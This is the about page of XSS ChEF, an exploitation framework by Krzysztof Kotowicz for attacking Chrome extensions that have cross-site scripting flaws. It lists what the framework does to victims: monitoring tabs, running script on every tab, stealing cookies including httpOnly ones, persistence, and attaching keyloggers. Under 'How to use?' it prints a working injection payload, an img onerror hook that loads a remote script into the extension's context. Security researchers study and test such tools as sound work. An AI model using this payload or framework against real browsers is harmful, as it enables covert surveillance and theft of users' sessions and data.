About XSS ChEF

XSS ChEF

by Krzysztof Kotowicz

v.0.1

About

This is a Chrome Exploitation Framework - think BeEF for Chrome extensions. Whenever you encounter a XSS vulnerability in Chrome extension, ChEF will ease the exploitation.

What can you do when having appropriate permissions?

  • Monitoring open tabs of victims
  • JS execution (XSS) on every tab
  • HTML extraction, reading/writing cookies (also httpOnly), localStorage
  • Persistence until browser is closed (or even futher if you can persist in extensions' localStorage)
  • Screenshot of your windows
  • Further exploitation e.g. via attaching BeEF hooks, keyloggers etc.

How to use?

Inject Chrome extension with a hook like this: 

<img src=x onerror="if(location.protocol.indexOf('chrome')==0){d=document;e=createElement('script');e.src='http://dev.localhost/xss-chef/xsschef.js';d.body.appendChild(e);}">

Launch this console and start having fun!
